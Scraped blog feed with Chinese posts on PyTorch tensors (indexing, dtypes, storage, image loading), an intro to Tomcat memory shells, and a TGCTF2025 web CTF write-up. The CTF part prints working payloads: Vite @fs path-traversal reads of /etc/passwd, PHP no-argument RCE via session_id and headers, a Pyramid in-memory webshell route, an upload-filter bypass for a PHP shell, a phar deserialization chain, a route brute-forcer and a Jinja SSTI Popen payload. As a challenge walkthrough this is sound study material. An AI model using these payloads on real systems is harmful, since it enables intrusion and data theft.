1]输出tensor(1.)#返回第0个点的y坐标，可以理解为二维数组访问元素的方法\n\n索引张量如果我们需要得到张量中除了第一个点之外的所有点，我们九十一使用列表中的切片，如在列表中\nsome_list = list(range(6)) some_list[:] #全部切片some_list[1:4] #第二个到第三个some_list[1:] #第二个以后some_list[:4] #第一个到第三个some_list[::1] #所有元素some_list[1:4:2]#第二个到第三个，步长为2\n\n在张量中，可以使用相同的表示法，在每一个维度都可以使用范围索引\npoints[1:] #第一行后的所有行，包含所有列points[1:, :] #第一行后的所有行，所有列points[1:, 0] #第一行后的所有行，第一列points[None]#增加大小为1的维度\n\n命名张量张量的维度或者是坐标轴通常用来表示诸如像素位置或者是颜色通道的信息，当我们需要将一个张量作为索引的时候，我们需要记住维度的顺序并以此顺序些索引\n假设有一个img_t的三维向量，为了简单，使用虚拟数据，将其转换为灰度图像，\nimg_t = torch.randn(3, 5, 5) # shape [channels, rows, columns] weights = torch.tensor([0.2126, 0.7152, 0.0722])\n\n如果希望代码具有通用性，从表示为具有高度和宽度的二维张量的灰度图像到添加第三个通道的彩色图像，或者从单幅图像到一批图像，假设增加的维度是2：\nbatch_t = torch.randn(2, 3, 5, 5) # shape [batch, channels, rows, columns]\n\nrgb通道有时候在第0维，有时在第一维，我们可以通过从末端开始计数来归纳，总是在从末端开始的第三维中，因此惰性的未加权平均值可以写成下面的形式：\nimg_gray_naive = img_t.mean(-3) batch_gray_naive = batch_t.mean(-3) img_gray_naive.shape, batch_gray_naive.shape 解释- 代码功能 ：- img_t.mean(-3) 和 batch_t.mean(-3) 都是沿着通道维度（第-3维）计算平均值- 这种计算方式被称为&quot;惰性&quot;或&quot;未加权&quot;灰度转换，因为它简单地对RGB通道取均值- 维度解释 ：- 对于单张图像 img_t (形状为 [C,H,W])：  - -3 表示通道维度（通常是第0维）  - 计算后会得到形状为 [H,W] 的灰度图- 对于批量图像 batch_t (形状为 [N,C,H,W])：  - -3 仍然是通道维度（第1维）  - 计算后会得到形状为 [N,H,W] 的批量灰度图    灰度图：灰度图（Grayscale Image）是指仅包含亮度信息而不包含颜色信息的图像\n\npytorch允许我们对相同形状的张量进行乘法运算，也允许与给定维度中其中一个操作数大小为1的张量进行计算，他还会自动附加大小为1 的前导维度，这个特性别称之为广播\n当创建和使用张量的位置在很远的时候，就很容易出现错误，可以给维度指定一个名称，\nweights_named = torch.tensor([0.2126, 0.7152, 0.0722], names=[&#x27;channels&#x27;]) weights_named输出tensor([0.2126, 0.7152, 0.0722], names=(&#x27;channels&#x27;,))\n\n当我们已经有一个张量并且想要为其添加名称但不改变现有的名称时，我们可以对其调用refine_names()方法。与索引类似，省略号（…）允许你省略任意数量的维度。使用rename()兄弟方法，还可以覆盖或删除（通过传入None）现有名称：\nimg_named = img_t.refine_names(..., &#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) batch_named = batch_t.refine_names(..., &#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) print(&quot;img named:&quot;, img_named.shape, img_named.names) print(&quot;batch named:&quot;, batch_named.shape, batch_named.names) img named: torch.Size([3, 5, 5]) (&#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) batch named: torch.Size([2, 3, 5, 5]) (None, &#x27;channels&#x27;, &#x27;rows&#x27;, &#x27;columns&#x27;) \n\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-4day","url":"/2025/04/16/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-4day/","content":"张量的元素类型到目前为止，已熟知张量的基本知识，但是还没有不晓得可以在张量中储存什么类型，数据科学库依赖于numpy或引入专用的数据结构，如pytorch张量，提供数字类型的数据的有效底层实现和相关操作，并将这些封装在一个方便的高级api中，要实现这一点，张量中的对象必须是相同类型的数字，pytorch必须跟踪这个数字类型\n使用dtype指定数字类型张量构造函数通过dtype参数指定包含在张量中的数字的数据类型，如tensor和zeros和ones函数，数据 类型用于指定张量可以保存的可能值，dtype参数类似于同名的标准numpy参数\n  torch.float32或torch.float：32位浮点数。  torch.float64或torch.double：64位双精度浮点数。  torch.float16或torch.half：16位半精度浮点数。  torch.int8：8位有符号整数。  torch.uint8：8位无符号整数。  torch.int16或torch.short：16位有符号整数。  torch.int32或torch.int：32位有符号整数。  torch.int64或torch.long：64位有符号整数。  torch.bool：布尔型。张量的默认数据类型是32位浮点数。用法# 创建float32类型张量（默认）a = torch.ones(3, dtype=torch.float32)# 创建float64（双精度）张量b = torch.randn(6, dtype=torch.float64)# 创建int32类型张量c = torch.zeros(4, dtype=torch.int32)\n\n管理张量的dtype属性为了给张量分配一个正确的数字类型，我们可以指定适当的dtype作为构造函数的参数，如：\na = torch.ones(3, dtype=torch.float32)\n\n可以通过访问相对应的属性dtype来访问一个张量的类型\n还可以使用相对应的转换方法将张量创建函数的输出转化为正确的类型，\ndouble_points = torch.zeros(10, 2).double() short_points = torch.ones(10, 2).short()或者使用更方便的方法：double_points = torch.zeros(10, 2).to(torch.double) short_points = torch.ones(10, 2).to(dtype=torch.short)\n\n在操作中输入多种类型的时候，输入会自动向较大类型转换，因此，如果我们想要进行32位计算，我们需要确保所有的输入都是32位的\npoints_64 = torch.rand(5, dtype=torch.double) points_short = points_64.to(torch.short) points_64 * points_short tensor([0., 0., 0., 0., 0.], dtype=torch.float64)\n\n张量的api到此，了解了什么是张量，以及他们在底层是如何工作的，关于张量以及张量种的绝大多数操作都可以在torch模块种找到，如transpose函数\n在PyTorch中，张量(Tensor)的API是指所有可以对张量进行操作和变换的方法和属性的集合。\n\n对张量操作按组进行划分\n创建操作—用于构造张量的函数，如ones()和from_numpy()。索引、切片、连接、转换操作—用于改变张量的形状、步长或内容的函数，如transpose()。数学操作—通过运算操作张量内容的函数：\t● 逐点操作—通过对每个元素分别应用一个函数来得到一个新的张量，如abs()和\t\tcos()；\t● 归约操作—通过迭代张量来计算聚合值的函数，如mean()、std()和norm()；\t● 比较操作—在张量上计算数字谓词的函数，如equal()和max()；\t● 频谱操作—在频域中进行变换和操作的函数；\t● 其他操作—作用于向量的特定函数（如cross()），或对矩阵进行操作的函数（如\ttrace()）；\t●  BLAS和LAPACK操作—符合基本线性代数子程序（Basic Linear Algebra Subprogram，BLAS）规范的函数，用于标量、向量—向量、矩阵—向量和矩阵—矩阵操作。随机采样—从概率分布中随机生成值的函数，如randn()和normal()。序列化—保存和加载张量的函数，如load()和save()。并行化—用于控制并行CPU执行的线程数的函数，如set_num_threads()。\n\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-5day","url":"/2025/04/17/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-5day/","content":"张量的存储视图在底层代码种，张量中的被分配到由torch.storage实例所管理的连续内存块当中，存储区是由数字数据所组成的一维数组，即包含给定类型的数字的连续内存块，如下图所示\n----------------|   张量(引用相同的储存区)   |-----------------|| 4 | 1 | 5 |                              |  4  |  1  || 3 | 2 | 1 |                              |  5  |  3  |从0开始，2行3列                             |  2  |  1  |                                           从0开始，3行2列存储区| 4 | 1 | 5 | 3 | 2 | 1 |.................                    张量是storage实例视图                       \n\n索引储存区在实际中如何使用二位点来索引储存区，可以使用storage()访问给定张量的存储区：\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) points.storage() 输出&lt;bound method Tensor.storage of tensor([[1., 2.],        [2., 3.],        [3., 4.]])&gt;\n\n在底层中，事实上储存的是一个连续的大小为6的连续数组，但是在你打印的时候是会自动进行还原的，我们可以手动索引储存区\na = torch.tensor([[1,2],[2,3],[3,4]],dtype=torch.float32)b = a.storage()print(b[0])输出1.0\n\n不能使用两个索引来索引二维张量的存储区，不管和存储区相关的任何其他张量的维度是多少，他的布局始终都是一维，也可以通过索引直接改变存储区的值\n张量元数据为了在存储区中建立索引，张量依赖于一些明确定义他们的信息，大小，偏移量和步长，大小，在numpy中又被称之为形状是一个元组，表示张量在每一个维度上有多少元素，偏移量就是指存储区中某元素相对第一个元素的索引，步长是指存储区中为了获得下一个元素需要跳过的元素的数量\n\n另一个张量的存储视图我们可以通过提供相应的索引来得到张量中的第二个点，\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1] second_point.storage_offset()//返回相对第一个元素的位置的偏移量\n\n函数size和shape属性所包含的信息是一致的\nsecond_point.shapetorch.Size([2]) \n\n步长是一个元素，知识当索引在每一个维度增加1的时候在存储区中必须要跳过的元素的数量，\n例如points的步长为（2，1），意思就是- 第一个数字 2 ：表示在第0维（行）上移动一格时，需要在底层存储中跳过2个元素。- 第二个数字 1 ：表示在第1维（列）上移动一格时，需要跳过1个元素。\n\n使用stride方法就可以获取到步长\n当我们索引一个特定的点，同时看到偏移量增加，表名我们已经提取了一个子张量\nsecond_point = points[1] second_point.size()输出torch.Size([2])second_point.storage_offset()#输出2second_point.stride()输出(1,)\n\n正如预期的那样，子张量的维度少了一维，但仍然能索引到与原始张量相同的存储区，更改子张量也会对原始张量产生影响\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1] second_point[0] = 10.0 points 输出tensor([[ 4., 1.],         \t\t[10., 3.],         \t\t[ 2., 1.]])\n\n可以使用clone方法将这个子张量复制成一个新的张量\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1].clone() second_point[0] = 10.0 points 输出tensor([[4., 1.],        \t[5., 3.],         \t[2., 1.]]\n\n无复制转置使用张量points，它在行中有单独的点，在列中有x和y的坐标，然后将其转置，使各个点都在列中，使用t()方法，用于转置一个矩阵\n并且这样转置出来的矩阵和原矩阵共用一个存储区\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1].clone() print(points.t())输出tensor([[4., 5., 2.],        [1., 3., 1.]])        可以验证这两个张量共享一个存储区id(points.storage()) == id(points_t.storage())输出true\n\n只是在形状和步长上有所不同\n将张量转置之后，如下图所示，我们在步长中改变元素顺序之后，增加的行将沿着存储区跳跃一个单位，就像沿着原张量的列移动一样，转置不会分配新的内存只是创建一个tensor的实例\n\n连续张量在pytorch中一些张量操作只对连续的张量起作用，使用contifuous方法可以将一个不连续的张量转换成一个连续的张量，但是步长和存储发生了改变\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) 、points_t = points.t() #转置points_t 输出tensor([[4., 5., 2.],         \t[1., 3., 1.]])\tpoints_t.storage()输出4.0   1.0   5.0   3.0   2.0   1.0#存储区域points_t.stride()#计算步长输出(1,2)points_t_cont = points_t_cont.contiguous()#转换points_t_cont输出tensor([[4., 5., 2.],         \t\t[1., 3., 1.]])#可以看到已经发生了转置\t\tpoints_t_cont.stride()#计算步长输出(3,1)#可以看到步长已经发生了改变points_t_cont.storage()输出4.0   5.0   2.0   1.0   3.0   1.0#存储区也发生了变化 \n\n将张量存储到Gpupytorch最重要的能够大幅提升运行速度的特性就是可以在gpu上和cpu上同时与逆行，以大规模的提升运算速度\n管理张量的设备属性\npytorch张量还有device的概念，就是张量数据在计算机上的位置\npoints_gpu = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]], device='cuda')\n\n可以使用to方法将在cpu上创建的张量复制到gpu上：\npoints_gpu = points.to(device='cuda')\n\n这样将会返回一个新的张量\n序列化张量创建动态的张量是很好的，但是如果里面的数据是有价值的，我们希望将其保存到一个文件当中，可以免去每次运行程序的时候都要从头开始对模型进行训练，可以使用pickle来序列化张量对象，并为存储添加专用的序列化代码，\ntorch.save(points, '../data/p1ch3/ourpoints.t')\n\n加载张量同样可以通过一行代码来实现\npoints = torch.load('../data/p1ch3/ourpoints.t')\n\n用这种方法可以快速的保存张量和使用张量\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"TGCTF2025复现","url":"/2025/04/17/TGCTF2025%E5%A4%8D%E7%8E%B0/","content":"TGCTF2025复现前言这次的tgctf也是一个不可多得好比赛，web总共15道，打了将近一半吧，有些题开始做的时候没什么思路，看了wp发现还是经验不足了，呜呜呜呜，想到明年就不是小登了，还要被小登创飞。\n前端game\n进入是一个前端小游戏页面，看了源码，数据报都没发现什么奇怪的地方，但是看到url栏上的#，我就知道这是一个vue前端，一般是搭配vate服务器使用的，查查这两个东西相关的漏洞，还真给我找到了，具体来说有三个相关的cve，都是文件读取漏洞\nCVE-2025-30208\n/@fs/etc/passwd?import&amp;raw??/@fs/etc/passwd?raw??/@fs/tgflagggg?import&amp;raw??/@fs/tgflagggg?raw??\n\n\n成功读取到文件\n前端gameplus升级版，没错，又是cve漏洞，还是文件读取\nCVE-2025-31486\n/etc/passwd?.svg?.wasm?init /tgflagggg?.svg?.wasm?init #这个打法，不太好猜路径curl \"http node1.tgctf.woooo.tech:32613/@fs/app/?/ / / / / /tgflagggg? import&amp;?raw\n\n\n前端game ultral没错，还是cve漏洞，\nCVE-2025-32395\n访问/@fs/tmp/获得绝对路径/app，同时给了附件看docker也能看出路径curl --request-target /@fs/app/#/ / / / / /etc/passwd http://node1.tgctf.woooo.tech:32742/curl --request-target /@fs/app/#/ / / / / /tgflagggg http://node2.tgctf.woooo.tech:31500/\n\n偷渡阴平无参数rce，可利用的方法有很多，session_id绕过waf，getheader绕过waf等等\n&lt;?php$tgctf2025=$_GET['tgctf2025'];if(!preg_match(\"/0|1|[3-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i\", $tgctf2025)){//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushieval($tgctf2025);}else{die('(╯‵□′)╯炸弹！•••*～●');}\n\n常规思路都被堵死了，\nprint_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));来查看根目录下的文件，也是成功读取到flag文件在根目录下\n\npaylaod构造\ntgctf2025=readfile(end(getallheaders()));\n\n在数据报中传入/flag就可以了\n\n也可以使用\n?tgctf2025=session_start();system(hex2bin(session_id())); PHPSESSID=636174202f666c6167       cat /flag的十六进制?tgctf2025=eval(end(current(get_defined_vars())));&amp;b=system('cat /flag');\n\n偷渡阴平（复仇）&lt;?php $tgctf2025=$_GET['tgctf2025']  if(!preg_match(\"/0|1|[3-9]|\\~|\\`|\\@|\\#| $|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\ \\ \\+|\\ \\ \\]|\\}|\\:|\\'|\\\"|\\,|\\ \\.|\\&gt;|\\/|\\? |\\\\\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|spli t|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|di r|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop| rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i\" , $tgctf2025)){ hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi } else{ die('(╯‵ □′)╯炸弹！•••*～●'); } highlight_file( FILE )\n\npayload：\n?tgctf2025=session_start();system(hex2bin(session_id()));PHPSESSID=636174202f666c6167   \n\n其他解法\n/?tgctf2025=system(implode(apache_request_headers()))\n\n熟悉的配方，熟悉的味 道pyramid内存马\nfrom pyramid.config import Configuratorfrom pyramid.request import Requestfrom pyramid.response import Responsefrom pyramid.view import view_configfrom wsgiref.simple_server import make_serverfrom pyramid.events import NewResponseimport refrom jinja2 import Environment, BaseLoadereval_globals = { #防止eval执行恶意代码    '__builtins__': {},      # 禁用所有内置函数    '__import__': None       # 禁止动态导入}def checkExpr(expr_input):    expr = re.split(r\"[-+*/]\", expr_input)    print(exec(expr_input))    if len(expr) != 2:        return 0    try:        int(expr[0])        int(expr[1])    except:        return 0    return 1def home_view(request):    expr_input = \"\"    result = \"\"    if request.method == 'POST':        expr_input = request.POST['expr']        if checkExpr(expr_input):            try:                result = eval(expr_input, eval_globals)            except Exception as e:                result = e        else:            result = \"爬！\"    template_str = 【xxx】    env = Environment(loader=BaseLoader())    template = env.from_string(template_str)    rendered = template.render(expr_input=expr_input, result=result)    return Response(rendered)if __name__ == '__main__':    with Configurator() as config:        config.add_route('home_view', '/')        config.add_view(home_view, route_name='home_view')        app = config.make_wsgi_app()    server = make_server('0.0.0.0', 9040, app)    server.serve_forever()\n\n说实话，内存马还是第一次见到，打完这个就得去好好研究一波了\n根据官方的wp来说，eval进行了严格的限制，其实是用来迷惑的，可以传入exec，是用来打内存马的\npayload：\nexpr=exec(\"config.add_route('shell_route','/17shell');config.add_view(lambda request:Response(__import__('os').popen(request.params.get('1')).read()),route_name='shell_route');app = config.make_wsgi_app()\")/17shell?1=ls /\n\n还是打不进去，暂且放在这，待我好好研究一下吧\nezuploads简单的文件上传，有点坑，dirsearch扫文件的时候，扫不出来bak后缀，还是我自己手动试出来的，下载upload.php.bak\n&lt;?phpdefine('UPLOAD_PATH', __DIR__ . '/uploads/');$is_upload = false;$msg = null;$status_code = 200; // 默认状态码为 200if (isset($_POST['submit'])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(\"php\", \"php5\", \"php4\", \"php3\", \"php2\", \"html\", \"htm\", \"phtml\", \"pht\", \"jsp\", \"jspa\", \"jspx\", \"jsw\", \"jsv\", \"jspf\", \"jtml\", \"asp\", \"aspx\", \"asa\", \"asax\", \"ascx\", \"ashx\", \"asmx\", \"cer\", \"swf\", \"htaccess\");        if (isset($_GET['name'])) {            $file_name = $_GET['name'];        } else {            $file_name = basename($_FILES['name']['name']);        }        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES['name']['tmp_name'];            $file_content = file_get_contents($temp_file);            if (preg_match('/.+?&lt;/s', $file_content)) {                $msg = '文件内容包含非法字符，禁止上传！';                $status_code = 403; // 403 表示禁止访问            } else {                $img_path = UPLOAD_PATH . $file_name;                if (move_uploaded_file($temp_file, $img_path)) {                    $is_upload = true;                    $msg = '文件上传成功！';                } else {                    $msg = '上传出错！';                    $status_code = 500; // 500 表示服务器内部错误                }            }        } else {            $msg = '禁止保存为该类型文件！';            $status_code = 403; // 403 表示禁止访问        }    } else {        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';        $status_code = 404; // 404 表示资源未找到    }}// 设置 HTTP 状态码http_response_code($status_code);// 输出结果echo json_encode([    'status_code' =&gt; $status_code,    'msg' =&gt; $msg,]);\n\n一眼丁真，move_uploaded_file的函数的漏洞，仔细看源码，文件名是由传入的name的值决定的，于是只需要get传参1.php/.就能绕过后缀名检测，然后针对内容检测，我塞了100万个垃圾数据，再传个一句话，蚁剑一连，打开终端读环境变量就可以了\n火眼辩魑魅robots.txt 直接打 tgshell.php\n无过滤，直接连蚁剑\n什么文件上传？robots.txt 进去有 class.php ，简单的反序列化\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class yesterday {    public $learn;    public $study=\"study\";    public $try;    public function __construct()    {        $this-&gt;learn = \"learn&lt;br&gt;\";    }    public function __destruct()    {        echo \"You studied hard yesterday.&lt;br&gt;\";        return $this-&gt;study-&gt;hard();    }}class today {    public $doing;    public $did;    public $done;    public function __construct(){        $this-&gt;did = \"What you did makes you outstanding.&lt;br&gt;\";    }    public function __call($arg1, $arg2)    {        $this-&gt;done = \"And what you've done has given you a choice.&lt;br&gt;\";        echo $this-&gt;done;        if(md5(md5($this-&gt;doing))==666){            return $this-&gt;doing();        }        else{            return $this-&gt;doing-&gt;better;        }    }}class tommoraw {    public $good;    public $bad;    public $soso;    public function __invoke(){        $this-&gt;good=\"You'll be good tommoraw!&lt;br&gt;\";        echo $this-&gt;good;    }    public function __get($arg1){        $this-&gt;bad=\"You'll be bad tommoraw!&lt;br&gt;\";    }}class future{    private $impossible=\"How can you get here?&lt;br&gt;\";    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __set($arg1, $arg2) {        if ($this-&gt;out-&gt;useful7) {            echo \"Seven is my lucky number&lt;br&gt;\";            system('whoami');        }    }    public function __toString(){        echo \"This is your future.&lt;br&gt;\";        system($_POST[\"wow\"]);        return \"win\";    }    public function __destruct(){        $this-&gt;no = \"no\";        return $this-&gt;no;    }}$evil = new yesterday();$evil -&gt; study = new today();$evil -&gt; study -&gt; doing = new future();\n\n然后会发现，不管上传什么文件都会报错，估计是有白名单，坑点，我上网找了一堆文件后缀，都不行，结果出题人说是捏造的后缀，我晕，atg，这个时候就可以直接打phar反序列化了\nphar = new Phar(\"exp.phar\"); //.phar文件$phar-&gt;startBuffering();$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;'); //固定的$phar-&gt;setMetadata($evil); //触发的头是C1e4r类，所以传入C1e4r对象$phar-&gt;addFromString(\"exp.txt\", \"test\"); //随便写点什么生成个签名$phar-&gt;stopBuffering();\n\nfile_exist函数是会触发phar反序列化的\n\n什么文件上传？（复仇）和上一题一样的，都是phar反序列化， 不过多赘述\n直面天命\n查看源码，发现有提示/hint\n点开hint告诉我还有另一个路由，可以直接爆破，贴上脚本\nimport itertoolsimport requestsimport stringimport timefrom urllib3.exceptions import InsecureRequestWarning# 禁用SSL警告requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)def generate_routes():    \"\"\"生成所有4位小写字母的组合\"\"\"    return [''.join(chars) for chars in itertools.product(string.ascii_lowercase, repeat=4)]def scan_routes(base_url, routes, timeout=5, delay=0.1):    \"\"\"扫描路由并检查状态码，找到第一个有效路由后停止\"\"\"    for index, route in enumerate(routes):        url = f\"{base_url}/{route}\"        try:            response = requests.get(url, timeout=timeout, verify=False)            if response.status_code == 200:                print(f\"[+] Found valid route: {url}\")                return url  # 找到第一个有效路由后返回            else:                print(f\"[-] Route not found: {url} (Status: {response.status_code})\")        except requests.exceptions.RequestException as e:            print(f\"[!] Error accessing {url}: {e}\")        except KeyboardInterrupt:            print(\"\\n[!] Scan interrupted by user.\")            return None        # 显示进度        if (index + 1) % 100 == 0:            print(f\"\\n[INFO] Scanned {index + 1}/{len(routes)} routes so far...\")        # 添加延迟以避免被封禁        time.sleep(delay)    return None  # 扫描完成但未找到有效路由def main():    # 警告信息    print(\"\\n\" + \"=\" * 50)    print(\"WARNING: This script should only be used on websites you own or have explicit permission to test.\")    print(\"Unauthorized scanning is illegal and unethical.\")    print(\"=\" * 50 + \"\\n\")    target_url = input(\"Enter the base URL (e.g., http://example.com): \")    confirm = input(\"\\nDo you confirm you have permission to scan this website? (yes/no): \")    if confirm.lower() != \"yes\":        print(\"Scan aborted.\")        return    # 生成路由组合    routes = generate_routes()    print(f\"\\nGenerated {len(routes)} routes to scan...\")    # 开始扫描    print(\"\\nStarting scan...\")    start_time = time.time()    valid_route = scan_routes(target_url, routes)    # 扫描完成    end_time = time.time()    print(f\"\\nScan completed in {end_time - start_time:.2f} seconds.\")    # 输出结果    if valid_route:        print(f\"\\n[+] Valid route found: {valid_route}\")    else:        print(\"\\n[-] No valid routes found.\")if __name__ == \"__main__\":    main()\n\n爆出来是aazz，来到aazz又告诉我可以传参，尝试了一些常见的参数名，发现是filename，尝试直接读取环境变量/proc/1/environ\n\n这是非预期解，我们来看看预期解\n通过filename直接读取app.py文件的源码\nimport os import string from flask import Flask, request, render_template_string, jsonify,send_from_directory from a.b.c.d.secret import secret_key\n\n可以知道secret在a.b.c.d.secret里面，是直面天命\n输入直面6*6天命发现：\n\n最终的payload：\n直面[][\"\\x5f\\x5fclass\\x5f\\x5f\"][\"\\x5f\\x5fmro\\x5f\\x5f\"][1] [\"\\x5f\\x5fsubclasses\\x5f\\x5f\"]()[351]('cat flag',shell=True,stdout=-1).communicate()[0].strip()天命\n\n模板注入的payload有很多的\n直面天命（复仇）和上一题样的，只不过由任意文件读取转变为源码展示，payload还是一样的\n","categories":["web"],"tags":["web"]},{"title":"内存马探知","url":"/2025/04/17/%E5%86%85%E5%AD%98%E9%A9%AC%E6%8E%A2%E7%9F%A5/","content":"内存马探知前言\n本文研究的是java的内存马，但是探索的过程是可以作为模板套用到挖掘其他组件上的漏洞的，后面会陆续挖掘python等语言的内存马，从我网上看了许多关于内存马的文章来说，java的内存马是很经典的\n初探内存马‘为了了解java的内存马，首先需要了解tomcat，来看看对于tomcat的总结\nTomcat 架构\n\nConnector 模块 ：是 Tomcat 与客户端通信的入口点。它接收客户端请求，并将其传递给容器进行处理。常见的 Connector 类型有 HTTP Connector（处理 HTTP 请求）和 AJP Connector（用于与 Apache HTTP Server 等 Web 服务器通信）。\nContainer 模块 ：负责处理请求和响应的业务逻辑。它包括多个子组件，如 Engine、Host 和 Context。Engine 是容器的顶层元素，Host 代表一个虚拟主机，Context 对应一个 Web 应用程序。\n\nTomcat 配置文件\n\nserver.xml ：这是 Tomcat 的主配置文件，定义了服务器的总体结构，包括 Connector、Container、Service 等组件的配置。例如，可以在这里配置 HTTP 端口、HTTPS 设置、虚拟主机等。\nweb.xml ：每个 Web 应用程序都有一个 web.xml 文件，用于定义应用程序的部署描述符。它包括诸如 Servlet 定义、Servlet 映射、过滤器配置等信息。\n\nTomcat 的组件（与内存马相关）\n\nClass Loader 组件 ：Tomcat 有自己独特的类加载器层次结构。它允许不同的 Web 应用程序加载自己的类，而不会相互干扰。这在一定程度上为内存马的隐藏和运行提供了可能。内存马可以利用类加载器的机制，在不修改磁盘文件的情况下，动态加载恶意类。\nServlet 容器组件 ：Servlet 是 Java Web 开发的核心组件。Tomcat 的 Servlet 容器负责加载、实例化和管理 Servlet。内存马可以伪装成正常的 Servlet，通过容器的生命周期方法（如 init()、service() 等）执行恶意代码。\n\nTomcat 的运行机制（与内存马相关）\n\n请求处理流程 ：当客户端发送请求到 Tomcat 时，Connector 接收请求，并将其解析为 HttpServletRequest 对象。然后，请求被传递给相应的 Context，根据 Servlet 映射找到对应的 Servlet，并调用其 service() 方法来处理请求。内存马可以在这个过程中拦截请求，篡改请求或响应内容，或者执行其他恶意操作。\n类加载和初始化 ：Tomcat 在启动过程中会加载和初始化各个组件，包括类加载器和 Servlet 容器。内存马可以在类加载器加载类或者 Servlet 容器初始化 Servlet 的阶段进行注入和激活。\n\n几个重要的组件Container和pipeline/valve","categories":["web"],"tags":["web"]},{"title":"深度学习-6day","url":"/2025/04/20/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-6day/","content":"使用张量表征真实数据新的知识\n·将真实数据表示为pytorch张量·处理一系列数据类型·从文件加载数据·将数据转换为张量·塑造张量，使他们作为神经网络模型的输入\n\n张量使pytorch中的数据的构建块，神经网络将张量作为输入，并生成张量作为输出，在神经网络内部所有操作其实都是张量之间的操作，神经网络中所有的参数都是张量，要想熟悉pytorch这样的工具，关键是需要了解如何对张量执行操作\n处理图像卷积神经网络的引入彻底的改变了计算机视觉，通过使用成对的输入和期望的输出样本来训练端到端网络，而常见图像加载，要将数据转换为张量所表示\n图像应该别表示为一个排列在具有高度和宽度的规则网格中的标量集合，其中高度和宽度以像素为单位，每一个网格点都有一个标量，将被表示为一个灰度图像，或者每个网格点有多个标量，这时每个标量通常会呈现不同的颜色，或者不同的特性\n添加颜色通道有几种方法可以将颜色编码为数字，最常见的方法是RGB，其中颜色由三个数字定义，分别白哦是红绿蓝的强度，我们可以把颜色通道看作是一个灰度强度图，如下图，其中每一个rgb通道都捕获了光谱的特定部分\n\n加载图像文件图像有几种不同的文件格式，但是在python中由很多的加载图像的方法，从使用imageio模块加载png格式的图像开始\nimport imageioimage_arr = imageio.imread('图片路径')print(image_arr.shape)\n\n此时img是一个具有三个维度的类numpy数组是对象，2个空间维度尺寸–宽度和高度，第三个维度对应红绿蓝色通道，\n改变布局可以使用张量的permute方法是每一个新的维度利用旧的维度得到一个合适的布局，给定输入张量，先布局通道2，然后是0和1，从而得到一个合适的布局\nimg = torch.from_numpy(image_arr)out = img.permute(2,0,1)\n\n解释一下为什么要改变布局，在深度学习和PyTorch中， 改变图像的布局（如 img.permute(2,0,1) ）的主要原因是为了适配神经网络的输入要求 。\n\n原始图片的布局\n\n用 imageio.imread 读取的图片，通常是 (高度, 宽度, 通道) ，即 (H, W, C) ，比如 (256, 256, 3) 。\n\n这种布局是大多数图像处理库（如OpenCV、PIL、imageio）的默认格式。\n\nPyTorch的张量布局要求\n\nPyTorch 的大多数神经网络（如卷积神经网络）要求输入格式为 (通道, 高度, 宽度) ，即 (C, H, W) 。\n\n例如，RGB图片应为 (3, 256, 256) 。\n\n为什么要这样做？\n\n这样做可以让网络高效地批量处理多张图片（batch），并且与PyTorch的底层实现和加速方式兼容。\n\n如果不转换，直接把 (H, W, C) 的图片输入网络，会导致维度不匹配，报错。\n\npermute(2,0,1) 的作用\n\n把原本的 (H, W, C) 变成 (C, H, W) ，即把通道维度移到最前面。\n\n\n改变图像布局是为了让图片数据符合PyTorch神经网络的输入格式要求，保证模型能够正确处理和训练。\n如果你后续要把多张图片组成一个 batch，还需要保证它们的 shape 都是 (C, H, W) ，这样才能直接堆叠成四维张量 (N, C, H, W) （N为图片数量）。\n该操作并没有复制张量数据，而是让out和img使用相同的底层存储，\n到目前位置，我们只描述了单幅图像，创建一个多图像的数据集作为神经网络的输入，沿着第一维度批量存储图像，以获得一个N x C x H x W的张量\n与使用stack构建张量相比，更有效的替代方法是我们可以预先分配一个适当大小的张量，并使用从目录中加载的图像填充他\nbatch_size = 3batch = 